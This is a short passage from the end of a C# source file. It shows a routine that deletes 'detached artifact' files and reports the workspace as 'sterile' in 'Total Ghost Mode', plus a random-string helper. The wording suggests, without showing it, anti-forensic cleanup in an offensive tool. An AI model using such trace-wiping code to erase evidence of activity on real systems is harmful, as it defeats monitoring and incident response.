                            Log($"[*] Detached artifact purged: {Path.GetFileName(target)}");
                        } 
                        catch (Exception ex) { 
                            Log($"[!] Failed to purge {Path.GetFileName(target)}: {ex.Message}"); 
                        }
                    }
                }

                Log("[+] Total Ghost Mode: Workspace is 100% sterile.");
            }
            catch (Exception ex)
            {
                Log($"[!] Cleanup routine encountered an anomaly: {ex.Message}");
            }
        }

        private string GenerateRandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            StringBuilder result = new StringBuilder(length);
            byte[] data = RandomNumberGenerator.GetBytes(length);
            foreach (byte b in data) result.Append(chars[b % chars.Length]);
            return result.ToString();
        }
    }
}